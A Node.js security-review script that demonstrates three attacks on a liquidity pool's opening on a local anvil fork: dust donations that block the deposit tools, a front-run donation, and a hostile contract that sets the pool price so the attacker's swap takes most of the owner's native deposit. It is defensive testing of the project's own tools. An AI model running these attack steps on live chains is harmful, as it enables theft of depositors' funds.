#!/usr/bin/env node
// Review r17 (agent 328): the package's own tools (deploy.sh, gate.mjs, first-deposit.mjs, frontend-files.mjs)
// against three attacks on the opening of a pool, on a loopback anvil fork of one chain. Demonstration only:
// throwaway keys, the reference plan, the fee address impersonated; nothing leaves loopback but the fork's reads.
//
//   node scripts/review/r328-fork-attack.mjs <chain> --port PORT --out DIR --pid-file FILE [--fork-url URL]
//
//   A (R328-3)  one base unit of the listed token at the pair's address: `prepare` fails; after the printed skim it
//               passes; one unit again: it fails again.
//   B (R328-2)  `prepare` passes; a donation lands before the printed deposit; the deposit succeeds, the reserves
//               are not "exactly the two amounts", `verify` fails; after the documented withdrawal `prepare` fails.
//   C (R328-1)  the depositing account calls a contract of the attacker once; the pool is open at 1 native = 2;
//               `prepare` says "use add"; the post gate passes and says `open`; the page record is written; `add`
//               prints 10 native + 20 token; the attacker's 600 token then buy the native side.
import { spawn, spawnSync } from "node:child_process";
import { createRequire } from "node:module";
import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { setTimeout as delay } from "node:timers/promises";
import { ROOT, loadArtifacts, loadChain, loadShared, lower, planChain, refuse } from "../multichain/lib.mjs";

const requireFromFrontend = createRequire(new URL("../../frontend/package.json", import.meta.url));
const { keccak256, encodeAbiParameters, encodeFunctionData, decodeFunctionResult, parseAbi, formatUnits } = requireFromFrontend("viem");
const { privateKeyToAccount, generatePrivateKey } = requireFromFrontend("viem/accounts");

const [key, ...rest] = process.argv.slice(2);
const opt = Object.fromEntries(rest.reduce((out, v, i, all) => (v.startsWith("--") ? [...out, [v.slice(2), all[i + 1]]] : out), []));
if (!key || !opt.port || !opt.out || !opt["pid-file"]) {
  console.error("usage: r328-fork-attack.mjs <chain> --port PORT --out DIR --pid-file FILE [--fork-url URL]");
  process.exit(2);
}
const shared = loadShared();
const chain = loadChain(key);
const plan = planChain(shared, chain, loadArtifacts(), { reference: true });
const url = `http://127.0.0.1:${Number(opt.port)}`;
const forkUrl = opt["fork-url"] ?? chain.rpc[0];
mkdirSync(opt.out, { recursive: true });

const ABI = parseAbi([
  "function balanceOf(address) view returns (uint256)",
  "function totalSupply() view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
  "function transfer(address,uint256) returns (bool)",
  "function getReserves() view returns (uint112,uint112,uint32)",
  "function skim(address)",
  "function createPair(address,address) returns (address)",
  "function claim()",
  "function removeLiquidityBLCH(address token,uint256 liquidity,uint256 amountTokenMin,uint256 amountBLCHMin,address to,uint256 deadline) returns (uint256,uint256)",
  "function swapExactTokensForBLCH(uint256 amountIn,uint256 amountOutMin,address[] path,address to,uint256 deadline) returns (uint256[])",
]);
const hex = (n) => `0x${BigInt(n).toString(16)}`;
let rpcId = 0;
async function rpc(method, params = []) {
  const response = await fetch(url, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: ++rpcId, method, params }) });
  const body = await response.json();
  if (body.error) throw new Error(`${method}: ${body.error.message}`);
  return body.result;
}
const call = (functionName, args) => encodeFunctionData({ abi: ABI, functionName, args });
const read = async (to, functionName, args = []) => decodeFunctionResult({ abi: ABI, functionName, data: await rpc("eth_call", [{ to, data: call(functionName, args) }, "latest"]) });
const nativeOf = async (a) => BigInt(await rpc("eth_getBalance", [a, "latest"]));

const evidence = { schema: "review.r328.fork-attack.v1", chain: plan.chain, forkOf: forkUrl, checks: [], outputs: {} };
const save = () => writeFileSync(join(opt.out, "evidence.json"), `${JSON.stringify(evidence, (_, v) => (typeof v === "bigint" ? v.toString() : v), 2)}\n`);
const check = (name, ok, detail) => {
  evidence.checks.push({ name, ok: Boolean(ok), ...(detail === undefined ? {} : { detail }) });
  console.log(`${ok ? "ok  " : "FAIL"} ${name}${detail === undefined ? "" : ` (${JSON.stringify(detail, (_, v) => (typeof v === "bigint" ? v.toString() : v))})`}`);
  save();
};

if (await rpc("eth_chainId").then(() => true, () => false)) {
  console.error(`something already answers on ${url}`);
  process.exit(2);
}
// Slow on the public endpoint on purpose (shared and rate-limited): a low request budget, retries with back-off.
const anvil = spawn("anvil", ["--fork-url", forkUrl, "--port", String(opt.port), "--host", "127.0.0.1", "--silent", "--compute-units-per-second", "40", "--retries", "8", "--fork-retry-backoff", "3000"], { stdio: ["ignore", "ignore", "inherit"] });
writeFileSync(opt["pid-file"], `${anvil.pid} anvil --fork-url ${forkUrl} --port ${opt.port}\n`);
for (const signal of ["SIGTERM", "SIGINT", "SIGHUP"]) process.on(signal, () => (anvil.kill("SIGTERM"), process.exit(143)));
process.on("exit", () => anvil.kill("SIGTERM"));
let failed = false;
try {
  for (let i = 0; ; i++) {
    try {
      refuse(Number(BigInt(await rpc("eth_chainId"))) === chain.chain.chainId, "the fork is not the chain");
      break;
    } catch (error) {
      if (i > 120) throw error;
      await delay(500);
    }
  }
  const account = () => privateKeyToAccount(generatePrivateKey());
  const deployerKey = generatePrivateKey();
  const deployer = privateKeyToAccount(deployerKey);
  const [attacker, helper] = [account(), account()];
  for (const a of [deployer, attacker, helper]) await rpc("anvil_setBalance", [a.address, hex(1000n * 10n ** 18n)]);

  async function send(from, { to, data = "0x", value = 0n }, label) {
    const price = BigInt(await rpc("eth_gasPrice")) * 2n + 1n;
    const gas = 4_000_000n;
    let hash;
    if (from.sign === false) hash = await rpc("eth_sendTransaction", [{ from: from.address, to, data, value: hex(value), gas: hex(gas), gasPrice: hex(price) }]);
    else hash = await rpc("eth_sendRawTransaction", [await from.signTransaction({ type: "legacy", chainId: chain.chain.chainId, nonce: Number(BigInt(await rpc("eth_getTransactionCount", [from.address, "pending"]))), to: to ?? undefined, data, value, gas, gasPrice: price })]);
    let receipt = null;
    for (let i = 0; i < 200 && !receipt; i++) {
      receipt = await rpc("eth_getTransactionReceipt", [hash]);
      if (!receipt) await delay(100);
    }
    refuse(receipt, `no receipt for ${label}`);
    return { label, hash, ok: receipt.status === "0x1", gasUsed: BigInt(receipt.gasUsed), feeWei: BigInt(receipt.gasUsed) * BigInt(receipt.effectiveGasPrice), contractAddress: receipt.contractAddress };
  }
  const must = async (...args) => {
    const r = await send(...args);
    refuse(r.ok, `${r.label} reverted`);
    return r;
  };

  // ---- the owner's deployment and the first post gate, as documented ----
  const run = spawnSync("bash", ["scripts/multichain/deploy.sh", key, "broadcast", "--rehearsal-rpc", url, "--reference", "--", "--private-key", deployerKey], { cwd: ROOT, encoding: "utf8", env: { ...process.env, FOUNDRY_DISABLE_NIGHTLY_WARNING: "1" } });
  writeFileSync(join(opt.out, "deploy.log"), `${run.stdout}\n${run.stderr}`.replaceAll(deployerKey, "<throwaway key>"));
  check("deploy.sh broadcast exits 0 on the fork", run.status === 0, run.status === 0 ? undefined : `${run.stdout}\n${run.stderr}`.slice(-400));
  if (run.status !== 0) throw new Error("the deployment failed");
  await rpc("anvil_mine", [hex(70)]);
  const tool = (script, args, name) => {
    const r = spawnSync("node", [script, ...args], { cwd: ROOT, encoding: "utf8" });
    const text = `${r.stdout}\n${r.stderr}`;
    writeFileSync(join(opt.out, `${name}.log`), text);
    evidence.outputs[name] = { status: r.status, tail: text.trim().split("\n").slice(-6) };
    save();
    return { status: r.status, text };
  };
  const gate = (name) => {
    const file = join(opt.out, `${name}.json`);
    const r = tool("scripts/multichain/gate.mjs", [key, "post", "--reference", "--rpc", url, "--rehearsal", "--out", file], name);
    return { ...r, file, report: existsSync(file) ? JSON.parse(readFileSync(file, "utf8")) : null };
  };
  const deployed = gate("gate-deployed");
  check("post gate after deployment: PASS, pair absent", deployed.status === 0 && deployed.report.pairs.every((p) => p.state === "absent"));

  const { factory, router } = Object.fromEntries(Object.values(plan.contracts).map((c) => [c.name, c.address]));
  const wrapped = chain.wrappedNative;
  const token = chain.tokens[0];
  const pair = plan.pairs[0].address;
  const unit = 10n ** BigInt(token.decimals);
  const depositor = plan.arguments.firstDepositor;
  const depositorAccount = { address: depositor, sign: false };
  await rpc("anvil_impersonateAccount", [depositor]);
  await rpc("anvil_setBalance", [depositor, hex(1000n * 10n ** 18n)]);
  async function fund(holder, amount) {
    for (let slot = 0n; slot < 80n; slot++) {
      for (const k of [keccak256(encodeAbiParameters([{ type: "address" }, { type: "uint256" }], [holder, slot])), keccak256(encodeAbiParameters([{ type: "uint256" }, { type: "address" }], [slot, holder]))]) {
        const before = await rpc("eth_getStorageAt", [token.address, k, "latest"]);
        await rpc("anvil_setStorageAt", [token.address, k, `0x${amount.toString(16).padStart(64, "0")}`]);
        if ((await read(token.address, "balanceOf", [holder])) === amount) return;
        await rpc("anvil_setStorageAt", [token.address, k, before]);
      }
    }
    throw new Error("no balance slot found");
  }
  await fund(depositor, 100_000n * unit);
  await fund(attacker.address, 10_000n * unit);
  const reserves = async () => {
    const [r0, r1] = await read(pair, "getReserves");
    const wrappedIs0 = lower(plan.pairs[0].token0) === lower(wrapped.address);
    return { native: wrappedIs0 ? r0 : r1, token: wrappedIs0 ? r1 : r0 };
  };
  const pairName = `${wrapped.symbol}/${token.symbol}`;
  const firstDeposit = (mode, name, extra = [], amounts = ["--native", "10", "--token", "30000"]) => {
    const out = join(opt.out, `${name}.json`);
    const r = tool("scripts/multichain/first-deposit.mjs", [key, mode, "--pair", pairName, ...amounts, "--reference", "--rpc", url, "--rehearsal", "--out", out, ...extra], name);
    return { ...r, result: existsSync(out) ? JSON.parse(readFileSync(out, "utf8")) : null };
  };
  const deadline = BigInt((await rpc("eth_getBlockByNumber", ["latest", false])).timestamp) + 86_400n;
  const snapshot = await rpc("evm_snapshot");

  // ---- A (R328-3): one base unit ----
  await must(attacker, { to: token.address, data: call("transfer", [pair, 1n]) }, "attacker sends one base unit to the pair's address");
  const a1 = firstDeposit("prepare", "A1-prepare", ["--gate-report", deployed.file]);
  check(`A: one base unit of ${token.symbol} (${formatUnits(1n, token.decimals)}) at the pair's address makes prepare fail`, a1.status === 1 && a1.result?.pair.state === "donated", a1.text.split("\n").filter((l) => l.startsWith("FAIL")).join(" | ").slice(0, 400));
  await must(helper, { to: factory, data: call("createPair", [wrapped.address, token.address]) }, "the printed remedy: createPair");
  await must(helper, { to: pair, data: call("skim", [depositor]) }, "the printed remedy: skim");
  const a2 = firstDeposit("prepare", "A2-prepare", ["--gate-report", deployed.file]);
  check("A: after the printed skim prepare passes", a2.status === 0);
  const again = await must(attacker, { to: token.address, data: call("transfer", [pair, 1n]) }, "attacker sends one base unit again");
  const a3 = firstDeposit("prepare", "A3-prepare", ["--gate-report", deployed.file]);
  check("A: one base unit again makes prepare fail again", a3.status === 1, { attackerGasPerRound: again.gasUsed });
  await must(helper, { to: pair, data: call("skim", [depositor]) }, "skim");

  // ---- B (R328-2): a donation between prepare and the deposit ----
  const b1 = firstDeposit("prepare", "B1-prepare", ["--gate-report", deployed.file]);
  check("B: prepare passes and prints the two transactions", b1.status === 0 && b1.result?.transactions.length === 2);
  await must(attacker, { to: token.address, data: call("transfer", [pair, 31n * unit]) }, "attacker sends 31 token units to the pair in front of the deposit");
  let deposit;
  for (const t of b1.result.transactions) deposit = await send(depositorAccount, { to: t.to, data: t.data, value: BigInt(t.value) }, `printed ${t.step}`);
  let r = await reserves();
  check("B: the printed deposit (minimums = amounts) does NOT revert, and the reserves are not exactly the two amounts", deposit.ok && r.native === 10n * 10n ** 18n && r.token === 30_031n * unit, { native: formatUnits(r.native, 18), token: formatUnits(r.token, token.decimals) });
  const b2 = firstDeposit("verify", "B2-verify", ["--tx", deposit.hash]);
  check("B: verify fails (more than 0.1% above the deposit)", b2.status === 1, b2.text.split("\n").filter((l) => l.startsWith("FAIL")).join(" | ").slice(0, 300));
  const shares = await read(pair, "balanceOf", [depositor]);
  await must(depositorAccount, { to: pair, data: call("approve", [router, shares]) }, "depositor approves its shares");
  await must(depositorAccount, { to: router, data: call("removeLiquidityBLCH", [token.address, shares, 0n, 0n, depositor, deadline]) }, "the documented remedy: the depositor withdraws");
  const b3 = firstDeposit("prepare", "B3-prepare", ["--gate-report", deployed.file]);
  r = await reserves();
  check("B: after the withdrawal the pair is open for ever with dust; prepare fails and points at add", b3.status === 1 && b3.result?.pair.state === "open" && /use `add`/.test(b3.text), { totalSupply: await read(pair, "totalSupply"), reserves: r });

  // ---- C (R328-1): the depositing account's origin ----
  refuse(await rpc("evm_revert", [snapshot]), "revert to the snapshot");
  const artifact = JSON.parse(readFileSync(join(ROOT, "out/R328FirstDeposit.t.sol/HostileClaim.json"), "utf8"));
  // 1e12 wei of native against 2e-12 of a token unit per wei: 1 native = 2 token units.
  const tokenDust = (2n * unit) / 10n ** 6n;
  refuse(tokenDust > 0n, "the token has too few decimals for this dust");
  const creation = `${artifact.bytecode.object}${encodeAbiParameters([{ type: "address" }, { type: "address" }, { type: "address" }, { type: "uint256" }], [factory, wrapped.address, token.address, tokenDust]).slice(2)}`;
  const hostile = (await must(attacker, { to: null, data: creation }, "attacker deploys the hostile contract")).contractAddress;
  await must(attacker, { to: hostile, value: 10n ** 12n }, "attacker funds it with 1e12 wei");
  await must(attacker, { to: token.address, data: call("transfer", [hostile, tokenDust]) }, "attacker funds it with the token dust");
  const claim = await send(depositorAccount, { to: hostile, data: call("claim", []) }, "the depositing account calls the hostile contract once");
  r = await reserves();
  check("C: one call of the depositing account to a hostile contract opens the planned pool at 1 native = 2 token", claim.ok && (await read(pair, "totalSupply")) > 0n && r.token * 10n ** 18n === 2n * unit * r.native, { native: r.native, token: r.token, attackerShares: await read(pair, "balanceOf", [attacker.address]) });
  const c1 = firstDeposit("prepare", "C1-prepare", ["--gate-report", deployed.file]);
  check("C: prepare fails and its only advice is `add`", c1.status === 1 && /use `add` for a pool that is already open/.test(c1.text), c1.text.split("\n").filter((l) => l.startsWith("FAIL")).join(" | ").slice(0, 300));
  await rpc("anvil_mine", [hex(70)]);
  const opened = gate("gate-hostile-open");
  check("C: the post gate PASSES and reports the hostile pool as open", opened.status === 0 && opened.report.pairs.every((p) => p.state === "open"), opened.report?.pairs.map((p) => ({ state: p.state, reserves: p.reserves })));
  const record = tool("scripts/multichain/frontend-files.mjs", [key, "--gate-report", opened.file, "--out", join(opt.out, "page"), "--rpc", url, "--rehearsal"], "C-frontend-files");
  const recordFile = join(opt.out, "page", key, "frontend.record.json");
  check("C: frontend-files.mjs writes a deployed record for the hostile pool", record.status === 0 && existsSync(recordFile) && JSON.parse(readFileSync(recordFile, "utf8")).status === "deployed");
  const c2 = firstDeposit("add", "C2-add", ["--gate-report", opened.file], ["--native", "10"]);
  const addDeposit = c2.result?.transactions?.find((t) => t.step === "deposit");
  check("C: add --native 10 PASSES and prints 10 native + 20 token units", c2.status === 0 && BigInt(c2.result.transactions[0].args[1]) === 20n * unit, c2.text.split("\n").filter((l) => l.startsWith("The deposit is")).join(" "));
  if (c2.status === 0) {
    for (const t of c2.result.transactions) await must(depositorAccount, { to: t.to, data: t.data, value: BigInt(t.value) }, `printed ${t.step}`);
    refuse(addDeposit, "no deposit");
    await must(attacker, { to: token.address, data: call("approve", [router, 600n * unit]) }, "attacker approves 600");
    const before = await nativeOf(attacker.address);
    const swap = await must(attacker, { to: router, data: call("swapExactTokensForBLCH", [600n * unit, 0n, [token.address, wrapped.address], attacker.address, deadline]) }, "attacker swaps 600 token units for the native coin");
    const taken = (await nativeOf(attacker.address)) - before + swap.feeWei;
    check("C: the attacker's 600 token units buy more than 9.6 of the owner's 10 native", taken > 96n * 10n ** 17n, formatUnits(taken, 18));
  }
} catch (error) {
  failed = true;
  console.error(error);
} finally {
  save();
}
const bad = evidence.checks.filter((c) => !c.ok).length;
console.log(`r328 fork attack ${key}: ${failed || bad ? "INCOMPLETE" : "ALL DEMONSTRATED"}; ${evidence.checks.length} checks, ${bad} not as expected`);
process.exit(failed || bad ? 1 : 0);
